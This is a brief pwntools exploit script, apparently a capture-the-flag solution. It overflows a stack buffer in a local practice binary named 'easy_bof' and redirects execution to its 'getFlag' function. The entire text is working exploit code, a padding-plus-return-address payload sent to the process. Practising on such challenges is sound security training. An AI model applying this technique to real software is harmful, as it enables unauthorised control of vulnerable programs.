from pwn import *

context.binary = elf = ELF('./easy_bof')

r = process(elf.path)
r.sendline(cyclic(0x28) + p64(elf.functions['getFlag'].address))
r.interactive()
